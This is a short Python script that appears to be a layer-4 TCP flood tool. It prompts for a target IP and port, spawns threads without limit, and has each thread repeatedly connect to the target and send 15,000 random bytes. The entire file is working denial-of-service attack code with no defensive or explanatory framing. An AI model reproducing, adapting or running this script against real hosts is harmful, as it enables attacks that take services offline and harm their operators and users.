import threading
import socket
import random

ip = socket.gethostbyname(input("IP: "))
port = int(input("Port: "))


def l4_tcp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))

            byte_s = random._urandom(15000)
            s.sendall(byte_s)

            print(f"\033[32m[+]\033[0m L4 TCP Packet sent -> {ip}:{port}")

            s.close()

        except Exception as err:
            print("\033[31m[-]\033[0m", err)


while True:
    t = threading.Thread(target=l4_tcp)
    t.start()
